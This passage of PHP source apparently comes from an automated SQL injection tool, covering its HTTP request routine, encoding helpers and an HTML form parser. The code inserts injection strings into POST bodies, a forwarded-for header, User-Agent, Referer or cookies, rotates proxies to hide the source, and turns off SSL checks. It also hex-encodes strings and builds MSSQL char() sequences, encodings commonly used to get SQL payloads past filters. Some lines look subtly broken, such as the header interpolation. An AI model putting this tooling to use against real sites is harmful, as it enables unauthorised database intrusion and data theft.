			$data = $this->get_to_post($url);
			$url = $data['url'];
			$qq = $data['post'];
			//$this->d($data,'$data');
			
			$this->form_set['form_post_query'] =$qq;
			
		}
		
		$url = str_replace(array('http://','https://'),'',$url);
		
		if($this->https)
		{
			$url_new = 'https://'.$url;
		}else
		{
			$url_new = 'http://'.$url;
		}
		
		if($this->h_s['post_static_url'] !=''){
			
			$url_new = $this->h_s['post_static_url'];
		}
		
		if($this->h_s['query'] !=''){
			$url_new = str_replace('?','',$url_new);
			$url_new = $url_new.'?'.$this->h_s['query'];
		}
		
		
		
		if($this->debug==true){$this->d($url_new,'$url_new_get_web_page');flush();}
		
		
		
		$ch = curl_init( );
		curl_setopt($ch, CURLOPT_URL, $url_new);           //url страницы
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);   //возращаться в файл 
		if($this->https)
		{
			curl_setopt($ch, CURLOPT_VERBOSE, true);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
			
		}
		if($this->header==true)
		{
			curl_setopt($ch, CURLOPT_HEADER, 1);           //возвращать заголовки
		}else
		{
			curl_setopt($ch, CURLOPT_HEADER, 0);           //возвращать заголовки
		}
	
		if($this->head_enable==true){
			
			
				
			if($this->h_s['post_static'] !=''){
				$this->d($this->h_s['post_static'],'post_static');
				curl_setopt($ch, CURLOPT_POST, true);
				curl_setopt($ch, CURLOPT_POSTFIELDS, 	$this->h_s['post_static']);
			}
			
			
			if($this->h_s['post'] !=''){
			
				if($this->h_s['inject'] =='post')
				{
					curl_setopt($ch, CURLOPT_POST, true);
					curl_setopt($ch, CURLOPT_POSTFIELDS, 	$qq);
					if($this->debug==true){$this->d("$qq",'post qq');}
				}
			}
			
			
			if($this->h_s['forwarder'] !=''){
								
								
				if($this->h_s['inject'] =='forwarder'){
					
					curl_setopt($ch, CURLOPT_HTTPHEADER, array ("x-forwarder-for: $this->h_s['sqli']"));
					if($this->debug==true){$this->d("$qq",'forwarder qq');}
				}else{
					
					curl_setopt($ch, CURLOPT_HTTPHEADER, array("x-forwarder-for: ".$this->h_s['forwarder']));
				}
			}
			
			
			if($this->h_s['useragent']  !=''){
								
				
				
				if($this->h_s['inject'] =='useragent'){
					
					curl_setopt($ch, CURLOPT_USERAGENT, "$qq");
					if($this->debug==true){$this->d($qq,'useragent qq');}
				}else{
					curl_setopt($ch, CURLOPT_USERAGENT, $this->h_s['useragent']);
				}
				
			}
			
			
			if($this->h_s['referer'] !=''){
								
				
				if($this->h_s['inject'] =='referer'){
					curl_setopt($ch, CURLOPT_REFERER, "$qq");
					if($this->debug==true){$this->d("$qq",'referer qq');}
				}else{
					curl_setopt($ch, CURLOPT_REFERER, $this->h_s['referer']);
				}		
				
			}
			
			
			if($this->h_s['cookies'] !=''){
												
								
				
				if($this->h_s['inject'] =='cookies'){
					curl_setopt($ch, CURLOPT_COOKIE, "$qq");
					if($this->debug==true){$this->d($qq,'cookies qq');}
				}else{
					curl_setopt($ch, CURLOPT_COOKIE, $this->h_s['cookies']);
				}
				
			}
			
			
			if($this->h_s['cookies_static'] !=''){
			
				curl_setopt($ch, CURLOPT_COOKIE, $this->h_s['cookies_static']);
				if($this->debug==true){$this->d($this->h_s['cookies_static'],'cookies_static');}
			}
			
			
		}
		
		@curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);   //переходить по ссылками 
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 18);  //таймаут соединения 
		curl_setopt($ch, CURLOPT_TIMEOUT, 18);         //тоже самое 
		curl_setopt($ch, CURLOPT_MAXREDIRS, 5);       //количество переходов 
		
		 
		
	    if($this->proxy != ''  AND $this->proxy_enable == true)
		{ 
			$rand_keys = array_rand ($this->proxy);
			
			$s = explode(':',$this->proxy[$rand_keys]);
			
			curl_setopt($ch, CURLOPT_PROXY, trim($s[0]).':'.trim($s[1])); 
				
		}
		 
          
		$content = curl_exec( $ch );
		$err     = curl_errno( $ch );
		$errmsg  = curl_error( $ch );
		$head = curl_getinfo( $ch );
          
		if($err !=0)
		{
			$this->error = 1;
			if($this->proxy == '' AND $this->proxy_enable == true)
			{
				$this->d('67 -  false');
				return false;
			}
		}
		  
		  
		 
		 //$this->d($err,'err');
		 //$this->d($errmsg,'errmsg');
		 //$this->d($head,'head');
		 //$this->d($content,'content');
		 
		 
		  
		
		  
		  $header['header'] =  $head;
          $header['errno']   = $err;
          $header['errmsg']  = $errmsg;
          $header['content'] = $content;
          
		  flush();
		  curl_close( $ch );
		
		//$this->d($header['header'],'$header');
		//$this->d($header,'$header');
		//$this->d($this->mssql,'$this->mssql');
		
		
		if($this->debug_full_content==true){
			
			$this->d($header,'debug_full_content get_web_page ');
		}
		
		
		//exit;
		
		if($this->mssql == true)
		{
			if(preg_match("/401|402|406/i",$header['header']['http_code']))
			{
				//$this->error = 1;
				$this->d($header['header']['http_code'].' - /401|402|406/ return false MSSQL');
				$this->d($header['header']['http_code'],'code');
				//$this->d($header['content'],'content');
				//return false;
			}	
		}else
		{
			
			if(preg_match("/401|402|403|404|406|501|502|503/i",$header['header']['http_code']))
			{
				//$this->error = 1;
				//$this->d($header['header']['http_code'].' - /401|402|403|404|406|501|502|503/ return false ALL');
				//$this->d($header['header']['http_code'],'code');
				//$this->d($header['content'],'content');
				//return false;
			}
		}

		  $ans['content'] = $content;
		  $ans['size'] = round(trim($head['size_download'])/1024, 1);
		  $ans['url'] = $url;
		  
		  if($ct == 1){//только сам контент возвращает
			return $header['content'];
		  }elseif($ct == 2){//только размер возвращает
			return $header['header']['size_download'];
		  }elseif($ct == 3){//полный возврат всего
			return $header;
		  }elseif($ct == 4){//возврат размера с округлением
			return round(trim($header['header']['size_download'])/1024, 1);
		  }elseif($ct == 5){//возврат размера с округлением
			return $ans;
		  }elseif($ct == 6){//возврат заголовков
			return $header['header'];
		  }
        }	

	public function myGetHeader($url){ 

			$url = parse_url($url);

			$post = '';
  
			//$fp = fsockopen($hostname)
			
			if(!$fp = fsockopen($url['host'], 80,$err,$strr,3))  {
				fclose($fp);
				return false;
			}
  
			if ($fp) {  

				fputs($fp, "POST ".$url['path']." HTTP/1.1\r\nHost: ".$url['host']." \r\n".  
                "User-Agent: gogle chrome:D \r\nContent-Type:".  
                " application/x-www-form-urlencoded\r\n".  
                "Content-Length: ".strlen($post)."\r\n".  
                "Connection: close\r\n\r\n$post");  
        
				$content = '';  
        
				while (!feof($fp)) {  

					$cont  = fgets($fp);  
				
					if(trim($cont)==''){
						
						break;
						return $content;  
					}else{
						$content [] = $cont;  
					}
        
				}  
				
				fclose($fp); 
				
				return $content;
				
  
    }  
   return $content;
 }  
	
	public function logg($str,$type='1'){//функция вывода на экран
	//1 - "[+]", 2 - "[-]", 3 - "[*]", 4 - ""
	$ret = '';
	if(($type<4)&&($type>0)){
		$z=array('+','-','*');
		$ret='<br>['.$z[$type-1].'] '.$str."<br>\r\n";
	}else{
		if($type==4)$ret= '<br>'.$str."<br>\r\n";
	}

	echo($ret);
	//$fp=fopen('./log.txt','a');
	//fwrite($fp,$ret);
	//fclose($fp);
	flush();
}
		
	public function url_set($query,$name){//возвращает полный url + запись в лог


	$tmp = $this->set['full'].$query;
	
	
	if($name)$this->sqli[$name][] = rawurldecode($tmp);//для лога
	if($name)$this->sqli[$name.'_encode'][] = $tmp;//для лога
	return $tmp;

}	

	public function urlParseUrl($url){

		$url = str_replace('&amp;', "&", $url);
		
		if(!strstr($url, '&'))
		{	
			return array($url);
		}
		
		$url_parse = parse_url($url);
		$url_params = explode('&', $url_parse['query']);
		
		
		//$this->d($url_parse,'$url_parse');
		
		
		foreach ($url_params as $param)
		{
			
			

			//$param = preg_replace("/(\?)/",'-',$param);
			
			//$this->d($param,'$param');
			
			$good_url = str_replace($param, '', $url).'&'.$param;
			
			//$this->d($good_url,'$good_url');
			
			
			$good_url = str_replace('&&', '&', $good_url);
			
			if(substr_count($good_url,'?')>2){
				$good_url = str_replace('/?&', '/?', $good_url);
				
			}else{
				
					$good_url = str_replace('?&', '?', $good_url);
			}
		
			
			$new[] = $good_url;
		
		}
		
		
		
		//$this->d($new);
		//exit;
		
		
		return $new;
//		die();
	}
	
	public function urlParseUrl3($url){//для add функции при добавлении в pull

		$url = str_replace('&amp;', "&", $url);
		
		
		$url_parse = parse_url($url);
		
		//$this->d($url_parse,'$url_parse');
		
		$url_params = explode('&', $url_parse['query']);
		
		
		//$this->d($url_params,'$url_params');

		$str = '';
		
		foreach ($url_params as $param)
		{

			$ppp = explode('=', $param);
			
			if(isset($ppp[0]) AND strlen($ppp[0])>1){
				$str .=$ppp[0].':';
				
			}
			
		}
		
		$res =  substr($str,0,-1);
		
		
		return $res;
		
	}
	
	public function postParseUrl($query){

		$query = str_replace('&amp;', "&", $query);
		
		
		$url_params = explode('&', $query);
		
		
		foreach ($url_params as $param)
		{
			//$param = str_replace('&', '', $param);
		
			$good_url = str_replace($param, '', $query).'&'.$param;
			$good_url = str_replace('&&', '&', $good_url);
			$good_url = str_replace('?&', '?', $good_url);
			
			//$this->d($good_url,'$good_url');
			
			if($good_url[0] == '&'){
				
				
				$good_url = substr($good_url,1);
			}

			
			$query2[] = $good_url;
			
		}
		
		
		
		return $query2;
//		die();
	}
	
	public function strtohex($string) { //служебная функция копирования
  
		  $hex='0x';
    for ($i=0; $i < strlen($string); $i++)
    {
        $hex .= dechex(ord($string[$i]));
    }
    return $hex;
  
		//return('0x'.$s); 

	} 

	public function asciiEncode($str){//переводит в ascii
      if(!preg_match("/^0x[A-Fa-f0-9]+/",$str)){
       return FALSE;   //Not a hex string
      }
       $str = substr($str,2);
     $asciiString = "";
      for($i=0;isset($str[$i]);$i+=2){
       $hexChar = substr($str,$i,2);
        $asciiString .= chr(hexdec($hexChar));
      }
   return $asciiString;
}
	
	public function HexValue($fitri){//переводит в hex
	$a = '';
	for($i = 0; $i < strlen($fitri); $i++)
	{
		$a .= dechex(ord($fitri[$i]));
	}
	return $a;
	}
	
	public function proxy_inj($proxy){
	
		//print_r($proxy);
		//die('aaaaaaaaaaaaaaaaaahhhhh');
	
		if(count($proxy) > 0)
			{
				//$rand_keys = array_rand ($proxy);
				//$this->proxy = $proxy[$rand_keys];
				//$this->d($this->proxy,'$this->proxy');
				$this->proxy_enable=true;
				$this->proxy = $proxy;
				
				
			}else
			{	
				die('NOT PROXY(proxy_inj)');
			}
			
	
	}
	
	public function charcher($code){//в другую кодировку перевод
	
		
		for($i=0;$i<strlen($code);$i++){
		
			
			@$text.=ord($code[$i]);
		
			if($i!==strlen($code)-1){
			
				@$text.=',';
		
			}
		
		}
		return $text;
	}
	
	public function charcher_mssql($code){//в другую кодировку перевод
	
		for($i=0;$i<strlen($code);$i++){
		
			
			@$text=ord($code[$i]);
		
			
			
			@$text_all.="char($text)+";
		
			
		
		}
		
		//return  $text_all;
		
		return substr($text_all, 0, -1);
	}
	
	public function d($txt,$text = '',$p = false){
		if($this->log_enable != false)
		{
			if($text != ''){echo "<br>------>>{$text}<<-------<br>";}
			
			
			if(is_array($txt) and $p !=false)
			{
				foreach($txt as $t)
				{
					echo $t.'<br>';
				}
			
			}else{
				echo '<pre>';
				print_r($txt);
				echo '</pre>';
			}
			if($text != ''){echo "------>>{$text}<<-------<br>";}
		}
	}
	
	public function dd($txt,$text = '',$p = false){
		
			if($text != ''){echo "<br>------>>{$text}<<-------<br>";}
			
			
			if(is_array($txt) and $p !=false)
			{
				foreach($txt as $t)
				{
					echo $t.'<br>';
				}
			
			}else{
				echo '<pre>';
				print_r($txt);
				echo '</pre>';
			}
			if($text != ''){echo "------>>{$text}<<-------<br>";}
		
	}

	public function deb($text,$prim = ''){

		echo "<br>--------$prim---------<br>";
		echo  "<pre>";
		print_r ($text);
		echo "</pre>";
	}

	
}


class HtmlFormParser {
	
	/**
	 * Core HTML Data
	 * @access public
	 * @var string
	 * @see HtmlFormParser()
	 */
	var $html_data = '';
	
	/**
	 * Param Array of all Elemets
	 * @access private
	 * @var array
	 */
	var $_return = array();
	
	/**
	 * Form counter
	 * @access private
	 * @var int
	 */
	var $_counter = '';
	
	/**
	 * Form button Counter
	 * @access private
	 * @var int
	 * @see parseForms()
	 */
	var $button_counter = '';
	
	/**
	 * unique identifiert for parsing
	 * @access private
	 * @var string
	 * @see HtmlFormParser()
	 */
	var $_unique_id = '';
	 
	/**
	 * HtmlFormParser Constructor
	 * @access public
	 * @param mixed $html_data Could be either an big array or an string
	 */
	function HtmlFormParser( $html_data ) {
		if ( is_array($html_data) ) {
			$this->html_data = join('', $html_data);
		} else {
			$this->html_data = $html_data;
		}
		$this->_return = array();
		$this->_counter = 0;
		$this->button_counter = 0;
		$this->_unique_id = md5(time());
	}
	
	/**
	 * Parse all Forms in given Data
	 * @access public
	 * @return array
	 */
	function parseForms() {
		if ( preg_match_all("/<form.*>.+<\/form>/isU", $this->html_data, $forms) ) 
		{
			foreach ( $forms[0] as $form ) 
			{
				/*
				 * Form Details like method, action ..
				 */
				preg_match("/<form.*name=[\"']?([\w\s]*)[\"']?[\s>]/i", $form, $form_name);
				$this->_return[$this->_counter]['form_data']['name'] = preg_replace("/[\"'<>]/", "", $form_name[1]);
				preg_match("/<form.*[^\?]action=(\"([^\"]*)\"|'([^']*)'|[^>\s]*)([^>]*)?>/is", $form, $action);
				$this->_return[$this->_counter]['form_data']['action'] = preg_replace("/[\"'<>]/", "", $action[1]);
				preg_match("/<form.*method=[\"']?([\w\s]*)[\"']?[\s>]/i", $form, $method);
				$this->_return[$this->_counter]['form_data']['method'] = preg_replace("/[\"'<>]/", "", $method[1]);
				preg_match("/<form.*enctype=(\"([^\"]*)\"|'([^']*)'|[^>\s]*)([^>]*)?>/is", $form, $enctype);
				$this->_return[$this->_counter]['form_data']['enctype'] = preg_replace("/[\"'<>]/", "", $enctype[1]);


				/*
				 * <textarea entries
				 */
				 
				 //	echo 1111111111111111111;
					//print_r($form);
				 
				if ( preg_match_all("/<textarea.*>.*<\/textarea>/isU", $form, $textareas) ) 
				{
				//echo 22222222222;
					
					foreach ( $textareas[0] as $textarea ) 
					{
						preg_match("/<textarea.*>(.*)<\/textarea>/isU", $textarea, $textarea_value);
						$this->_return[$this->_counter]['form_elemets'][$this->_getName($textarea)] = array(
																							'type'	=> 'textarea',
																							'value'	=> $textarea_value[1]
																							);
					}
				}
				
////////////////////////////////////////// начало добавленного цикла по input

				if ( preg_match_all("/<input.*?>/ims", $form, $gtinputs) ) 
				{
			foreach ( $gtinputs[0] as $gtinput) 
			{

				/*
				 * <input without type
				 */
				if ( preg_match_all("/<input .*?>/ims", $gtinput, $wotypes) ) 
				{
					foreach ( $wotypes[0] as $wotype) 
					{
						if (!stristr($wotype,'type='))
						{
						$this->_return[$this->_counter]['form_elemets'][$this->_getName($wotype)] = array(
																							'type'	=> 'text',
																							'value'	=> $this->_getValue($wotype)
																							);
						}
					}
				}

				
				/*
				 * <input type=hidden entries
				 */
				if ( preg_match_all("/<input.*type=[\"']?hidden[\"']?.*>/iU", $gtinput, $hiddens) ) 
				{
					foreach ( $hiddens[0] as $hidden ) 
					{
					
						$this->_return[$this->_counter]['form_elemets'][$this->_getName($hidden)] = array(
																							'type'	=> 'hidden',
																							'value'	=> $this->_getValue($hidden)
																							);
					}
				}
				
				/*
				 * <input type=text entries
				 */

				if ( preg_match_all("/<input.*type=[\"']?text[\"']?.*>/iU", $gtinput, $texts) ) 
				{
					foreach ( $texts[0] as $text ) 
					{
						$this->_return[$this->_counter]['form_elemets'][$this->_getName($text)] = array(
																							'type'	=> 'text',
																							'value'	=> $this->_getValue($text)
																							);
					}
				}

							/*
				 * <input type=file entries
				 */
				if ( preg_match_all("/<input.*type=[\"']?file[\"']?.*>/iU", $gtinput, $files) ) 
				{ 
					foreach ( $files[0] as $file ) 
					{
						$this->_return[$this->_counter]['form_elemets'][$this->_getName($file)] = array(
																							'type'	=> 'file',
																							'value'	=> $this->_getValue($file)
																							);
					}
				}
				
				/*
				 * <input type=password entries
				 */
				if ( preg_match_all("/<input.*type=[\"']?password[\"']?.*>/iU", $gtinput, $passwords) ) 
				{ 
					foreach ( $passwords[0] as $password ) 
					{
						$this->_return[$this->_counter]['form_elemets'][$this->_getName($password)] = array(
																							'type'	=> 'password',
																							'value'	=> $this->_getValue($password)
																							);
					}
				}
				
				
				
				/*
				 * <input type=checkbox entries
				 */
				if ( preg_match_all("/<input.*type=[\"']?checkbox[\"']?.*>/iU", $gtinput, $checkboxes) ) 
				{
					foreach ( $checkboxes[0] as $checkbox ) 
					{
						if ( preg_match("/checked/i", $checkbox) ) 
						{
							$this->_return[$this->_counter]['form_elemets'][$this->_getName($checkbox)] = array(
																							'type'	=> 'checkbox',
																							'value'	=> 'on'
																							);
						} else {
							$this->_return[$this->_counter]['form_elemets'][$this->_getName($checkbox)] = array(
																							'type'	=> 'checkbox',
																							'value'	=> ''
																							);
						}
					}
				}
				
				/*
				 * <input type=radio entries
				 */
				if ( preg_match_all("/<input.*type=[\"']?radio[\"']?.*>/iU", $gtinput, $radios) ) {
					foreach ( $radios[0] as $radio ) {
						if ( preg_match("/checked/i", $radio) ) {
							$this->_return[$this->_counter]['form_elemets'][$this->_getName($radio)] = array(
																							'type'	=> 'radio',
																							'value'	=> $this->_getValue($radio)
																							);
						}
					}		
				}
				
				/*
				 * <input type=submit entries
				 */
				if ( preg_match_all("/<input.*type=[\"']?submit[\"']?.*>/iU", $gtinput, $submits) ) {
					foreach ( $submits[0] as $submit ) {
						$this->_return[$this->_counter]['buttons'][$this->button_counter] = array(
																							'type'	=> 'submit',
																							'name'	=> $this->_getName($submit),
																							'value'	=> $this->_getValue($submit)
																							);
						$this->button_counter++;
					}
				}
				
				/*
				 * <input type=button entries
				 */
				if ( preg_match_all("/<input.*type=[\"']?button[\"']?.*>/iU", $gtinput, $buttons) ) {
					foreach ( $buttons[0] as $button ) {
						$this->_return[$this->_counter]['buttons'][$this->button_counter] = array(
																							'type'	=> 'button',
																							'name'	=> $this->_getName($button),
																							'value'	=> $this->_getValue($button)
																							);
						$this->button_counter++;
					}
				}
				
				/*
				 * <input type=reset entries
				 */
				if ( preg_match_all("/<input.*type=[\"']?reset[\"']?.*>/iU", $gtinput, $resets) ) {
					foreach ( $resets[0] as $reset ) {
						$this->_return[$this->_counter]['buttons'][$this->button_counter] = array(
																							'type'	=> 'reset',
																							'name'	=> $this->_getName($reset),
																							'value'	=> $this->_getValue($reset)
																							);
						$this->button_counter++;
					}
				}
				
				/*
				 * <input type=image entries
				 */
				if ( preg_match_all("/<input.*type=[\"']?image[\"']?.*>/iU", $gtinput, $images) ) {
					foreach ( $images[0] as $image ) {
						$this->_return[$this->_counter]['buttons'][$this->button_counter] = array(
																							'type'	=> 'reset',
																							'name'	=> $this->_getName($image),
																							'value'	=> $this->_getValue($image)
																							);
						$this->button_counter++;
					}
				}


			

	
		 	}
		}

		////////////////////////////////////////// конец добавленного цикла






				/*
				 * <input type=select entries
				 * Here I have to go on step around to grep at first all select names and then
				 * the content. Seems not to work in an other way
				 */
				if ( preg_match_all("/<select.*>.+<\/select>/isU", $form, $selects) ) {
					foreach ( $selects[0] as $select ) {
						if ( preg_match_all("/<option.*>.+<\/option>/isU", $select, $all_options) ) {
							foreach ( $all_options[0] as $option ) {
								if ( preg_match("/selected/i", $option) ) {
									if ( preg_match("/value=[\"'](.*)[\"']\s/iU", $option, $option_value) ) {
										$option_value = $option_value[1];
										$found_selected = 1;
									} else {
										preg_match("/<option.*>(.*)<\/option>/isU", $option, $option_value);
										$option_value = $option_value[1];
										$found_selected = 1;
									}
								}
							}
							if ( !isset($found_selected) ) {
								if ( preg_match("/value=[\"'](.*)[\"']/iU", $all_options[0][0], $option_value) ) {
									$option_value = $option_value[1];
								} else {
									preg_match("/<option>(.*)<\/option>/iU", $all_options[0][0], $option_value);
									$option_value = $option_value[1];
								}
							} else {
								unset($found_selected);
							}
							$this->_return[$this->_counter]['form_elemets'][$this->_getName($select)] = array(
																									'type'	=> 'select',
																									'value'	=> trim($option_value)
																									);
						}
					}
				}

				/*
				 * Update the form counter if we have more then 1 form in the HTML table
				 */
				$this->_counter++;
			}
		}
		return $this->_return;
	}
	
	/**
	 * Get Name from string
	 * @access private
	 * @param string
	 * @return string
	 */
	function _getName( $string ) {
		if ( preg_match("/name=[\"']?([\w\s\]\[]*)[\"']?[\s>]/i", $string, $match) ) {
			$val_match = preg_replace("/\"'/", "", trim($match[1]));
			
			unset($string);
			return $val_match;
		}
	}
	
	/**
	 * Get Value from string
	 * @access private
	 * @param string
	 * @return string
	 */
	function _getValue( $string ) {
		if ( preg_match("/value=(\"([^\"]*)\"|'([^']*)'|[^>\s]*)([^>]*)?>/is", $string, $match) ) {
			$val_match = trim($match[1]);
			
			if ( strstr($val_match, '"') ) {
				$val_match = str_replace('"', '', $val_match);
			}
			
			unset($string);
			return $val_match;
		}
	}

}

?>